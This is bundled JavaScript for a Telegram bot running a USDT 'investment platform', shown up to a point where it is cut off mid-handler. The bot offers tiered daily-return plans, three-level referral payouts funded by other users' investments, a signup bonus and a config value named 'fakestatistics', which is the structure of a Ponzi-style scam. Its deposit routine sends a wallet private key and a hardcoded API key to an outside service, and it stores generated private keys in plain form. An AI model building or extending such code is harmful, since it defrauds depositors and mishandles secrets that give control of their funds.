(() => {
    
    var e = {
            383: (e) => {
                e.exports = require("./details");
            },
            986: (e) => {
                "use strict";
                e.exports = require("body-parser");
            },
            860: (e) => {
                "use strict";
                e.exports = require("express");
            },
            13: (e) => {
                "use strict";
                e.exports = require("mongodb");
            },
            809: (e) => {
                "use strict";
                e.exports = require("node-fetch");
            },
            832: (e) => {
                "use strict";
                e.exports = require("telegraf");
            },
            535: (e) => {
                "use strict";
                e.exports = require("telegraf-ratelimit");
            },
        },
        t = {};
    function a(n) {
        var r = t[n];
        if (void 0 !== r) return r.exports;
        var s = (t[n] = { exports: {} });
        return e[n](s, s.exports, a), s.exports;
    }
    (() => {
        const { Telegraf: e, session: t, Extra: n, Markup: r, Scenes: s, Context: i } = a(832),
            { BaseScene: o, Stage: l } = s,
            { enter: d, leave: c } = l,
            u = new l(),
            m = a(535),
            f = a(13).MongoClient,
            p = a(809),
            { token: y, admins: w, curr: v, lvl: h, profit_percent: g, minAmount: k, daily_hour: b, mongo_url: _, aboutmsg: $, fakestatistics: D, PrivateKey: T, appname: U } = a(383),
            S = new e(y),
            A = a(860),
            B = a(986),
            M = A();
        M.use(B.urlencoded({ extended: !1 })), M.use(B.json());
        const I = new o("investamo");
        u.register(I);
        const O = new o("manualconvert");
        u.register(O);
        const W = new o("senderSupport");
        u.register(W);
        const C = new o("setwallet");
        u.register(C);
        const SD = new o("reinvestamo");
        u.register(SD);
        const N = new o("refercode");
        u.register(N);
        const P = new o("onwith");
        u.register(P);
        const L = new o("mini");
        u.register(L);
        const Y = new o("support");
        u.register(Y);
        const F = new o("max");
        u.register(F);
        const R = new o("tax");
        u.register(R);
        const E = new o("mkey"),
            z = new o("calcprofit");
        u.register(E), u.register(z);
        const q = new o("mid");
        u.register(q);
        const j = new o("subid");
        u.register(j);
        const H = new o("comment");
        u.register(H);
        const Q = new o("addcha");
        u.register(Q);
        const G = new o("rcha");
        u.register(G);
        const K = new o("getref");
        u.register(K);
        const Z = new o("chabal");
        u.register(Z);
        const V = new o("getdetails");
        u.register(V);
        const J = new o("refdetails");
        u.register(J);
        const X = new o("paycha");
        u.register(X);
        const ee = new o("broad");
        function getaddress(){
            const address = "your address"
            return address
        }
        function te(e, t) {
            try {
                for (const t of w) de(t, "*😢 Wtf! Error Happened In Bot:\n\n" + e + "\n\n*", { parse_mode: "Markdown" });
            } catch (e) {
                console.log(e);
            }
        }
        u.register(ee);
        const ae = {
            window: 1e3,
            limit: 1,
            onLimitExceeded: (e, t) => {
                "callback_query" in e.update && e.answerCbQuery("😅 Oops! Take it slow! Please avoid pressing buttons too quickly. Give it another try and take your time. Thank you!", !0).catch((e) => te(e));
            },
            keyGenerator: (e) => !!e.callbackQuery,
        };
        let ne;
        S.use(m(ae)),
            S.use(t()),
            S.use(u.middleware()),
            f.connect(_, { useUnifiedTopology: !0 }, (e, t) => {
                e ? console.log(e) : ((ne = t.db(y.split(":")[0])), S.launch());
            }),
            console.log("Bot hosted on server. Try sending /start.");
            var re = [
                ["💰 Wealth", "💹 Invest ", "💲Top Up"],
                ["💸 Cash Out", "👬 Share & Earn", "🖥️ Calculate "],
                ["📱 Talk to Us", "🔍 About Us"],
            ];
            
            let se = [
                ["💵 Investments", "💸 Withdrawals"],
                ["💼 Wallet Change"],
                ["⬅️ Back"]
              ];
        se.map((e) => e.map((e) => ({ text: e, resize_keyboard: !0, one_time_keyboard: !0 })));
        const ie = async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if (!t.length) {
                        let t = { admin: "admin", ref: 1, mini: 2, max: 4, paycha: "@Username", botstat: "Active", withstat: "On", subid: "Not Set", mid: "NOT SET", mkey: "NOT SET", comment: "NOT SET", tax: 0, channels: [] };
                        return ne.collection("admin").insertOne(t), void ue(e, "*👀 Bot Data Saved In Database Try To Restart Bot /start*");
                    }
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if ((await ne.collection("info").find({ user: e.from.id }).toArray())[0]) {
                        let t = "Welcome back! Here's the menu:";
                        de(e.from.id, t, { parse_mode: "Markdown", reply_markup: { keyboard: re, resize_keyboard: true} });
                    } else {
                        let t = "🎉 Welcome! 🔍 Enter referral code to activate your account. Get benefits from our amazing users. ⚠️ Valid code required for sign-up. Join now and enjoy the perks!"




                        de(e.from.id, t, { parse_mode: "Markdown" }), await e.scene.enter("refercode");
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            },
            oe = async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if (!t.length) {
                        let t = { admin: "admin", ref: 0, mini: 2, max: 4, paycha: "@Username", botstat: "Active", withstat: "On", subid: "Not Set", mid: "NOT SET", mkey: "NOT SET", comment: "NOT SET", tax: 0, channels: [] };
                        ne.collection("admin").insertOne(t);
                        let a = {
                            user: e.from.id,
                            depositBalance: 10,
                            userdeposit: 0,
                            referinfo: "",
                            balance: 10,
                            depositBalance: 2,
                            activeInvestments: 0,
                            totalProfit: 0,
                            totalAffiliateBonus: 0,
                            wallet: "NOT SET",
                            depositAddress: "NOT SET",
                            depositAddressPrivateKey: "NOT SET",
                            activated: !0,
                            referlvl1user: e.from.id,
                            referlvl2user: e.from.id,
                            referlvl3user: e.from.id,
                            referlvl1count: 0,
                            referlvl2count: 0,
                            referlvl3count: 0,
                            referraldeposits: 0,
                        };
                        return await ne.collection("info").insertOne(a), void ue(e, "* Data Saved In Database Try To Restart Bot /start , You are admin*");
                    }
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if ("/start" == e.message.text)
                        if ((await ne.collection("info").find({ user: e.from.id }).toArray())[0]) {
                            let t = "Welcome back! Here's the menu:";
                            de(e.from.id, t, { parse_mode: "Markdown", reply_markup: { keyboard: re, resize_keyboard: true} });
                        } else {
                            let t = "🎉 Welcome! 🔍 Enter referral code to activate your account. Get benefits from our amazing users. ⚠️ Valid code required for sign-up. Join now and enjoy the perks!"
                            de(e.from.id, t, { parse_mode: "Markdown" }), await e.scene.enter("refercode");
                        }
                } catch (e) {
                    console.log(e), te(e);
                }
            };
        async function le(e, t) {
            try {
                await S.telegram.deleteMessage(e, t);
            } catch (e) {
                console.log(e);
            }
        }
        async function de(e, t, a) {
            try {
                a ? await S.telegram.sendMessage(e, t, a) : await S.telegram.sendMessage(e, t);
            } catch (e) {
                console.log(e);
            }
        }
        async function ce(e, t, a) {
            try {
                a ? await e.editMessageText(t, a) : await e.editMessageText(t);
            } catch (e) {
                console.log(e);
            }
        }
        async function ue(e, t, a) {
            try {
                a ? await e.replyWithMarkdown(t, a) : await e.replyWithMarkdown(t);
            } catch (e) {
                console.log(e);
            }
        }
        S.start(oe),
            N.on("text", async (e) => {
                try {
                    if ((await ne.collection("info").find({ user: e.from.id }).toArray())[0]) S.start(oe);
                    else {
                        let t = "refercode",
                            a = e.message.text,
                            n = await ne.collection("info").find({ referinfo: a }).toArray();
                        if (!n[0]) return void ue(e, "🚨 Oops! It appears that the referral code you entered is incorrect or invalid. Please verify the code and try again.");
                        let r = {
                            user: e.from.id,
                            referinfo: "",
                            balance: 0,
                            depositBalance: 2,
                            userdeposit: 0,
                            activeInvestments: 0,
                            totalProfit: 0,
                            totalAffiliateBonus: 0,
                            wallet: "NOT SET",
                            depositAddress: "NOT SET",
                            depositAddressPrivateKey: "NOT SET",
                            activated: !0,
                            referlvl1user: n[0].user,
                            referlvl2user: n[0].referlvl1user,
                            referlvl3user: n[0].referlvl2user,
                            referlvl1count: 0,
                            referlvl2count: 0,
                            referlvl3count: 0,
                            referraldeposits: 0,
                            date: new Date().toLocaleString("en-US", { timeZone: "UTC" }),
                        };
                        await ne.collection("info").insertOne(r);
                        let s = { firstname: e.from.first_name, userid: e.from.id, earnings: 0, deposits: 0 };
                        ne.collection("lvl1users") || (await ne.createCollection("lvl1users"), await ne.createCollection("lvl2users"), await ne.createCollection("lvl3users"));
                        const i = { user: e.from.id, registeredUsers: [] };
                        await ne.collection("lvl1users").insertOne(i), await ne.collection("lvl2users").insertOne(i), await ne.collection("lvl3users").insertOne(i);
                        let o = await ne.collection("lvl1users").findOne({ user: n[0].user });
                        (o = o || { registeredUsers: [] }), o.registeredUsers.push(s), await ne.collection("lvl1users").updateOne({ user: n[0].user }, { $set: { registeredUsers: o.registeredUsers } });
                        let l = await ne.collection("lvl2users").findOne({ user: n[0].referlvl1user });
                        (l = l || { registeredUsers: [] }), l.registeredUsers.push(s), await ne.collection("lvl2users").updateOne({ user: n[0].referlvl1user }, { $set: { registeredUsers: l.registeredUsers } });
                        let d = await ne.collection("lvl3users").findOne({ user: n[0].referlvl2user });
                        (d = d || { registeredUsers: [] }),
                            d.registeredUsers.push(s),
                            await ne.collection("lvl3users").updateOne({ user: n[0].referlvl2user }, { $set: { registeredUsers: d.registeredUsers } }),
                            await ne.collection("info").updateOne({ user: n[0].user }, { $inc: { referlvl1count: 1 } }),
                            await ne.collection("info").updateOne({ user: n[0].referlvl1user }, { $inc: { referlvl2count: 1 } }),
                            await ne.collection("info").updateOne({ user: n[0].referlvl2user }, { $inc: { referlvl3count: 1 } }),
                            await ne.collection("statistics").updateOne({}, { $inc: { totalUsers: 1 } }),
                            ue(e, "*👏 You're now eligible for signup with us! We're thrilled to have you join our community and thank you for choosing us.*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }),
                            ue(e, "🎉 Congratulations! You've just received a $2 USDT signup bonus, which has been credited to your account! 🤑\n\n", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                        let c = `➕ *New Referral:* ${e.from.first_name} on level 1`;
                        await de(n[0].user, c, { parse_mode: "Markdown" });
                        let u = `➕ *New Referral:* ${e.from.first_name} on level 2`;
                        await de(n[0].referlvl1user, u, { parse_mode: "Markdown" });
                        let m = `➕ *New Referral:* ${e.from.first_name} on level 3`;
                        await de(n[0].referlvl2user, m, { parse_mode: "Markdown" }), await e.scene.leave(t);
                    }
                } catch (t) {
                    console.log(t), te(t), await e.scene.leave("refercode");
                }
            }),
            S.hears(["Back 🔙", "↩️ Back to Menu", "⬅️ Back"], async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    de(e.from.id, "*We are back to Home Page 🏠* ", { parse_mode: "Markdown", reply_markup: { keyboard: re, resize_keyboard: !0 } });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.action("invest", async (e) => {
                try {
                    let t = await ne.collection("info").find({ user: e.from.id }).toArray();
                    if (!("activated" in t[0])) return void ie(e);
                    let a = "depositBalance" in t[0] ? fe(t[0].depositBalance, 8) : "0.00000000";
                    if (Number(a) < 1) return void e.answerCbQuery("You don't meet the minimum balance requirement of 1 USDT. Please deposit funds to continue.", { show_alert: !0 });
                    ce(
                        e,
                        `\n*💰 Investment Options 💸*\n\n🎉 *Your maximum investable amount is* _ ${a} USDT_.\n    \n💡 Here are your investment plan options in (USDT): 💡 \n 1️⃣ *${g[0]}%* daily return for *${k[0]}* to *${
                            k[1] - 0.01
                        }*.\n 2️⃣ *${g[1]}%* daily return for *${k[1]}* to *${k[2] - 0.01}*. \n 3️⃣ *${g[2]}%* daily return for *${
                            k[2]
                        } *or more.\n    \n⏰ After 24 hours, you will receive your initial investment amount plus your gain.\n🚀 Ready to launch your investment journey? Let's go! 💪'\n\n*Simply enter the amount you'd like to invest below to start earning.*`,
                        { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "backToInvest" }]] }, parse_mode: "Markdown" }
                    ),
                        await e.scene.enter("investamo", { user: e.from.id });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            I.on("text", async (e) => {
                try {
                    const t = "investamo";
                    if ("↩️ Back" == e.message.text) return void (await e.scene.leave(t));
                    {
                        let a = parseFloat(e.message.text);
                        if (isNaN(a)) return void e.reply("⛔️ Enter numerical value Only,try again");
                        if (a < 100)
                            return (
                                await le(e.chat.id, e.message.message_id),
                                await le(e.chat.id, e.message.message_id - 1),
                                await ue(e, `❌ Investment Failed\n\n⚠️ Your entered investment amount of ${a} USDT is below the minimum investment requirement of 100 USDT. Please enter a valid amount to proceed. 💰`, {
                                    reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                                    parse_mode: "markdown",
                                }),
                                void (await e.scene.leave(t))
                            );
                        const n = await ne.collection("info").find({ user: e.scene.state.user }).toArray(),
                            r = "depositBalance" in n[0] ? fe(n[0].depositBalance, 8) : "0.00000000";
                        if (a > parseFloat(r))
                            return (
                                await le(e.chat.id, e.message.message_id),
                                await le(e.chat.id, e.message.message_id - 1),
                                await ue(e, `❌ Failed to start a new investment\n\n⚠️ Your entered amount of ${a} USDT exceeds your investable balance of ${r} USDT. Please deposit additional funds to proceed. 💰`, {
                                    reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                                }),
                                void (await e.scene.leave(t))
                            );
                        await ne.collection("info").updateOne({ user: e.scene.state.user }, { $inc: { depositBalance: -a } }), await ne.collection("statistics").updateOne({}, { $inc: { totalInvests: a } });
                        let s = { daily_amount: k[0], daily_expired: 1, daily_hour: b[0], profit_percent: g[0] },
                            i = { daily_amount: k[1], daily_expired: 1, daily_hour: b[1], profit_percent: g[1] },
                            o = { daily_amount: k[2], daily_expired: 1, daily_hour: b[2], profit_percent: g[2] },
                            l = null;
                        l = a >= o.daily_amount ? o : a >= i.daily_amount ? i : s;
                        let d = ((a * l.profit_percent) / 100) * l.daily_expired,
                            c = (l.daily_hour, l.daily_hour),
                            u = Math.ceil(l.daily_expired / 24),
                            m = a + d,
                            f = `✅ *Successfully Started Investment* \n\n💰 *Amount Invested:* ${a} USDT\n📈 *Plan:* ${l.profit_percent}% daily for ${l.daily_expired} days\n⏱ *Credit Time:* ${l.profit_percent}% every ${
                                l.daily_hour
                            } hours\n\n⌛️ *After ${c} Hours:* ${m.toFixed(2)} USDT\n🚀 *Your first payment will arrive after ${c} hours!*\n\n💸 *After ${u} Days:* ${m.toFixed(
                                2
                            )} USDT\n❓ *You will get back more than what you invested after just ${l.daily_expired} days.*\n\n🔥 *Total Profit:* ${d.toFixed(2)} USDT`;
                        await ne.collection("info").updateOne({ user: n[0].referlvl1user }, { $inc: { totalAffiliateBonus: (d * h[0]) , balance: (d * h[0]) ,userdeposit:(d * h[0]) } }),
                            await ne.collection("info").updateOne({ user: e.from.id }, { $inc: { activeInvestments: a } }),
                            await ne.collection("info").updateOne({ user: n[0].referlvl2user }, { $inc: { totalAffiliateBonus: (d * h[1]) , balance: (d * h[1]),userdeposit:(d * h[1])  } }),
                            await ne.collection("info").updateOne({ user: n[0].referlvl3user }, { $inc: { totalAffiliateBonus: (d * h[2]) , balance: (d * h[2]) ,userdeposit:(d * h[2]) } }),
                            await ne.collection("lvl1users").updateOne({ user: n[0].referlvl1user, "registeredUsers.userid": e.from.id }, { $inc: { "registeredUsers.$.earnings": (d * h[0])  } }),
                            await ne.collection("lvl2users").updateOne({ user: n[0].referlvl2user, "registeredUsers.userid": e.from.id }, { $inc: { "registeredUsers.$.earnings": (d * h[1])  } }),
                            await ne.collection("lvl3users").updateOne({ user: n[0].referlvl3user, "registeredUsers.userid": e.from.id }, { $inc: { "registeredUsers.$.earnings": (d * h[2])  } }),
                            await (async function (e, t, a, n) {
                                const r = Date.now(),
                                    s = r + 864e5;
                                await ne.collection("pendinginvestmentsall").insertOne({ user: t, name: a, amount: e, gain: n, scheduledTime: s });
                                const i = { user: t },
                                    o = { $push: { investments: { user: t, firstname: a, starttime: r, endtime: s, amount: e, gain: n, status: "pending" } } };
                                await ne.collection("userinvestmentinlist").updateOne(i, o, { upsert: !0 });
                            })(a, e.from.id, e.from.first_name, m),
                            await le(e.chat.id, e.message.message_id),
                            await le(e.chat.id, e.message.message_id - 1),
                            await ue(e, f, { reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] } }),
                            await de(n[0].referlvl1user, `🎉 Congratulations! Your referral ${e.from.first_name} has made an investment, and you have earned ${fe((d * h[0]) , 4)} USDT as a referral bonus! 🤑 Keep up the good work and continue earning rewards! 💪`),
                            await de(n[0].referlvl2user, `🎉 Congratulations! Your referral ${e.from.first_name} has made an investment, and you have earned ${fe((d * h[1]) , 4)} USDT as a referral bonus! 🤑 Keep up the good work and continue earning rewards! 💪`),
                            await de(n[0].referlvl3user, `🎉 Congratulations! Your referral ${e.from.first_name} has made an investment, and you have earned ${fe((d * h[2]) , 4)} USDT as a referral bonus! 🤑 Keep up the good work and continue earning rewards! 💪`),
                            await e.scene.leave(t);
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            }),SD.on("text", async (e) => {
                try {
                    const t = "reinvestamo";
                    if ("↩️ Back" == e.message.text) return void (await e.scene.leave(t));
                    {
                        let a = parseFloat(e.message.text);
                        if (isNaN(a)) return void e.reply("⛔️ Enter numerical value Only,try again");
                        if (a < 100)
                            return (
                                await le(e.chat.id, e.message.message_id),
                                await le(e.chat.id, e.message.message_id - 1),
                                await ue(e, `❌ Investment Failed\n\n⚠️ Your entered investment amount of ${a} USDT is below the minimum re-investment requirement of 100 USDT. Please enter a valid amount to proceed. 💰`, {
                                    reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                                    parse_mode: "markdown",
                                }),
                                void (await e.scene.leave(t))
                            );
                        const n = await ne.collection("info").find({ user: e.scene.state.user }).toArray(),
                            r = n[0].balance;
                        if (a > parseFloat(r))
                            return (
                                await le(e.chat.id, e.message.message_id),
                                await le(e.chat.id, e.message.message_id - 1),
                                await ue(e, `❌ Failed to start a new re-investment\n\n⚠️ Your entered amount of ${a} USDT exceeds your re-investable balance of ${r} USDT. Please deposit additional funds to proceed. 💰`, {
                                    reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                                }),
                                void (await e.scene.leave(t))
                            );
                        await ne.collection("info").updateOne({ user: e.scene.state.user }, { $inc: { balance: -a } }), await ne.collection("statistics").updateOne({}, { $inc: { totalInvests: a } });
                        let s = { daily_amount: k[0], daily_expired: 1, daily_hour: b[0], profit_percent: g[0] },
                            i = { daily_amount: k[1], daily_expired: 1, daily_hour: b[1], profit_percent: g[1] },
                            o = { daily_amount: k[2], daily_expired: 1, daily_hour: b[2], profit_percent: g[2] },
                            l = null;
                        l = a >= o.daily_amount ? o : a >= i.daily_amount ? i : s;
                        let d = ((a * l.profit_percent) / 100) * l.daily_expired,
                            c = (l.daily_hour, l.daily_hour),
                            u = Math.ceil(l.daily_expired / 24),
                            m = a + d,
                            f = `✅ *Successfully Started Re-Investment* \n\n💰 *Amount Re-Invested:* ${a} USDT\n📈 *Plan:* ${l.profit_percent}% daily for ${l.daily_expired} days\n⏱ *Credit Time:* ${l.profit_percent}% every ${
                                l.daily_hour
                            } hours\n\n⌛️ *After ${c} Hours:* ${m.toFixed(2)} USDT\n🚀 *Your first payment will arrive after ${c} hours!*\n\n💸 *After ${u} Days:* ${m.toFixed(
                                2
                            )} USDT\n❓ *You will get back more than what you invested after just ${l.daily_expired} days.*\n\n🔥 *Total Profit:* ${d.toFixed(2)} USDT`;
                         await ne.collection("info").updateOne({ user: e.from.id }, { $inc: { activeInvestments: a } }),
                           await (async function (e, t, a, n) {
                                const r = Date.now(),
                                    s = r + 864e5;
                                await ne.collection("pendinginvestmentsall").insertOne({ user: t, name: a, amount: e, gain: n, scheduledTime: s });
                                const i = { user: t },
                                    o = { $push: { investments: { user: t, firstname: a, starttime: r, endtime: s, amount: e, gain: n, status: "pending" } } };
                                await ne.collection("userinvestmentinlist").updateOne(i, o, { upsert: !0 });
                            })(a, e.from.id, e.from.first_name, m),
                            await le(e.chat.id, e.message.message_id),
                            await le(e.chat.id, e.message.message_id - 1),
                            await ue(e, f, { reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] } }),
                            await e.scene.leave(t);
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            setInterval(async function () {
                const e = Date.now(),
                    t = await ne
                        .collection("pendinginvestmentsall")
                        .find({ scheduledTime: { $lte: e } })
                        .toArray();
                for (const e of t) {
                    const { user: t, amount: a, gain: n } = e;
                    await ne.collection("info").updateOne({ user: t }, { $inc: { balance: n, totalProfit: n - a, activeInvestments: -a,userdeposit:n - a } }),
                        de(t, "🎉 Congratulations! Your investment of *" + a + " USDT* has been completed! We have credited *" + n + " USDT* to your withdrawable account", { parse_mode: "Markdown" });
                    const r = { user: t, "investments.amount": a, "investments.status": "pending" },
                        s = { $set: { "investments.$.status": "completed" } };
                    await ne.collection("userinvestmentinlist").updateOne(r, s), await ne.collection("pendinginvestmentsall").deleteOne({ _id: e._id });
                }
            }, 6e4),
            S.action("backToInvest", async (e) => {
                try {
                    let t = await ne.collection("info").find({ user: e.from.id }).toArray();
                    if (!("activated" in t[0])) return void ie(e);
                    await e.scene.leave("investamo");
                     let n = `*What would you like to do?*\n\n🔁 Reinvest – ReInvest Your Withdrawal balance\n📈 Invest – Invest from deposit balance to earn daily Gain.\n\n💳 *Re-investable Balance:* ${ "balance" in t[0] ? fe(t[0].balance, 8) : "0.00000000" } *USDT*\n💹 *Investable Balance:* ${"depositBalance" in t[0] ? fe(t[0].depositBalance, 8) : "0.00000000"} *USDT*\n\n`, r = [[{ text: "🔁 Reinvest", callback_data: "convertToDeposit" }], [{ text: "📈 Invest", callback_data: "invest" }]]; await ce(e, n, { reply_markup: { inline_keyboard: r }, parse_mode: "Markdown" });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.hears("💵 Investments", async (e) => {
                const t = e.from.id,
                    a = await ne.collection("userinvestmentinlist").findOne({ user: t });
                if (!a || !a.investments || 0 === a.investments.length) return void e.reply("🙁 Looks like you haven't started your investment journey with us yet! Don't worry, we're here to help you get started. Take the first step and explore our investment options today to build your investment history with us!");
                const n = a.investments.length,
                    r = Math.ceil(n / 10);
                let s = n - 1;
                for (let t = 0; t < r; t++) {
                    let n = `💰 *Your Investment History:* (${s + 1}-${Math.max(0, s - 9)})\n\n`;
                    for (let e = 0; e < 10 && s >= 0; e++) {
                        const r = a.investments[s],
                            i = new Date(r.starttime).toLocaleDateString(),
                            o = new Date(r.endtime).toLocaleDateString();
                        let l = "";
                        if ("completed" !== r.status) {
                            const e = r.endtime - Date.now();
                            l = `${Math.floor(e / 36e5)}h ${Math.floor((e % 36e5) / 6e4)}m ${Math.floor((e % 6e4) / 1e3)}s`;
                        }
                        (n += `*${e + 1 + 10 * t})* Amount: ${r.amount} USDT\n    Start Date: ${i}\n    End Date: ${o}`), "" !== l && (n += `\n    Remaining Time: ${l}`), (n += `\n    Status: ${r.status}\n\n`), s--;
                    }
                    ue(e, n);
                }
            }),
            S.hears("💰 My Deposits", async (e) => {
                try {
                    const t = e.from.id,
                        a = await ne.collection("userdeposits").findOne({ user: t });
                    if (!a) return void e.reply("🙁 You have no deposit history yet!");
                    const n = a.deposits.length,
                        r = Math.ceil(n / 10);
                    let s = n - 1;
                    for (let t = 0; t < r; t++) {
                        let n = `💰 *Your Deposit History:* (${s + 1}-${Math.max(0, s - 9)})\n\n`;
                        for (let e = 0; e < 10 && s >= 0; e++) {
                            const r = a.deposits[s],
                                i = r.date,
                                o = r.txId;
                            (n += `*${e + 1 + 10 * t})* Amount: ${r.amount} USDT\n    Date: ${i}\n    Tx ID: [${r.txId}](${o})\n    Block Number: ${r.blockNumber}\n\n`), s--;
                        }
                        ue(e, n, { disable_web_page_preview: !0 });
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.hears("💸 Withdrawals", async (e) => {
                try {
                    const t = e.from.id,
                        a = await ne.collection("withdraw").find({ user: t }).toArray();
                    if (0 === a.length) return void e.reply("🙁 It seems like you haven't made any withdrawals yet. Don't worry, when you're ready to cash out your earnings, our seamless withdrawal process will be here to assist you. Start earning and take advantage of our convenient withdrawal options!");
                    const n = a.length,
                        r = Math.ceil(n / 10);
                    let s = n - 1;
                    for (let t = 0; t < r; t++) {
                        let n = `💸 *Your Withdrawal History:* (${s + 1}-${Math.max(0, s - 9)})\n\n`;
                        for (let e = 0; e < 10 && s >= 0; e++) {
                            const r = a[s],
                                i = r.date.toLocaleString("en-US", { timeZone: "UTC" }),
                                o = "Pending" === r.status ? "PendingTransaction" : `[${r.txId}](${r.txId})`;
                            (n += `*${e + 1 + 10 * t})* Amount: ${r.amount} USDT\n    Date: ${i}\n    Tx ID: ${o}\n    Wallet: ${r.wallet}\n    Status: ${r.status}\n\n`), s--;
                        }
                        e.replyWithMarkdown(n, { disable_web_page_preview: !0 });
                    }
                } catch (t) {
                    console.log(t), e.reply("An error occurred while fetching your withdrawal history.");
                }
            }),
            S.hears("ststats", async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    const a = await ne.collection("statistics").findOne();
                    a || (await ne.collection("statistics").insertOne(D)),
                        ue(
                            e,
                            `📊 Statistics 📈\n\n👥 Total Users: ${a.totalUsers}\n💰 Total Deposits (USDT): ${a.totalDeposits}\n💵 Total Invests: ${a.totalInvests}\n💸 Total Withdrawals (USDT): ${
                                a.totalWithdrawals
                            }\n🕒 Server Time: ${new Date().toLocaleString("en-US", { timeZone: "UTC" })}`
                        );
                } catch (e) {
                    console.log(e), te(e);
                }
            });
        const me = `👋 Welcome to our investment platform!\n\n💰 Ready to earn some passive income? Choose from our 3 investment plans:\n\n1⃣ Plan 1: Invest  ${k[0]}-${k[1] - 0.01} USDT and earn ${
            g[0]
        }% daily for 24 hours.\n2⃣ Plan 2: Invest  ${k[1]}-${k[2] - 0.01} USDT and earn ${g[1]}% daily for 24 hours.\n3⃣ Plan 3: Invest  ${k[2]}+ USDT and earn ${
            g[2]
        }% daily for 24 hours.\n\n📈 All plans pay out daily! \n\n⚠️ Please note: Deposits less than ${
            k[0]
        } USDT will be cancelled.\n\n✅ Ready to invest? Simply send USDT Bep-20 to our deposit address and start earning!\n\n👉 Thank you for choosing our investment platform. We look forward to helping you grow your wealth!`;
        function fe(e, t) {
            const a = 10 ** t;
            return (Math.round(e * a) / a).toFixed(t);
        }
        function pe() {
            const e = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            let t = "";
            for (let a = 0; a < 5; a++) t += e[Math.floor(Math.random() * e.length)];
            return t;
        }
       
        S.hears("💲Top Up", async (e) => {
            try {
                let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                if ("private" != e.message.chat.type) return;
                if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                let a = await ne.collection("info").find({ user: e.from.id }).toArray();
                if (!("activated" in a[0])) return void ie(e);
                if (a[0].depositAddress && "NOT SET" != a[0].depositAddress) {
                    await ue(e, me);
                    const t = `*Deposit Address:* \`${a[0].depositAddress}\``,
                        n = { text: "🔍 Generate QR Code", callback_data: `qr ${a[0].depositAddress}` };
                    de(e.from.id, t, { reply_markup: { inline_keyboard: [[n]] }, parse_mode: "Markdown" });
                } else {
                    de(e.from.id, "🤖 Hold on tight, I'm generating your deposit address! This will only take a moment. 🚀", { parse_mode: "Markdown" });
                    const t = await (async function (e) {
                        try {
                            const t = "https://" + U + ".up.railway.app/" + e.from.id,
                                a = { apikey: "cf1c3da73820af4c69e01f4555bc23c5", bsc_address: getaddress(), bscPrivateKey: T, ipn_url: t },
                                n = await p("https://BSC-RPC.up.railway.app/generate-address", { method: "POST", body: JSON.stringify(a), headers: { "Content-Type": "application/json" } }),
                                r = await n.json();
                            return console.log(r), "failed" === r.status ? (te(r.message), "Failed") : { address: r.address, privateKey: r.privateKey };
                        } catch (e) {
                            console.log(e);
                        }
                    })(e);
                    if ("Failed" == t) de(e.from.id, "*❌ Failed to generate your deposit address. Please try again.*", { parse_mode: "Markdown" });
                    else {
                        await ue(e, me), await ne.collection("info").updateOne({ user: e.from.id }, { $set: { depositAddress: t.address, depositAddressPrivateKey: t.privateKey } });
                        const a = `*Deposit Address:* \`${t.address}\``,
                            n = { text: "🔍 Generate QR Code", callback_data: `qr ${t.address}` };
                        de(e.from.id, a, { reply_markup: { inline_keyboard: [[n]], parse_mode: "Markdown" } });
                    }
                }
            } catch (e) {
                console.log(e), te(e);
            }
        }),
            S.action(/^qr (.+)$/, async (e) => {
                try {
                    const t = e.match[1],
                        a = `https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=${t}`,
                        n = `*Deposit Address:* \`${t}\``,
                        r = { url: a },
                        s = { inline_keyboard: [[{ text: "↩️ Back", callback_data: "BackToDeposit" }]] },
                        i = { parse_mode: "Markdown" };
                    e.deleteMessage(e.message), await e.replyWithPhoto(r, { caption: n, reply_markup: s, ...i });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.action("BackToDeposit", async (e) => {
                try {
                    let t = await ne.collection("info").find({ user: e.from.id }).toArray();
                    const a = `*Deposit Address:* \`${t[0].depositAddress}\``,
                        n = { text: "🔍 Generate QR Code", callback_data: `qr ${t[0].depositAddress}` };
                    e.deleteMessage(e.message), ue(e, a, { reply_markup: { inline_keyboard: [[n]] }, parse_mode: "Markdown" });
                } catch (e) {
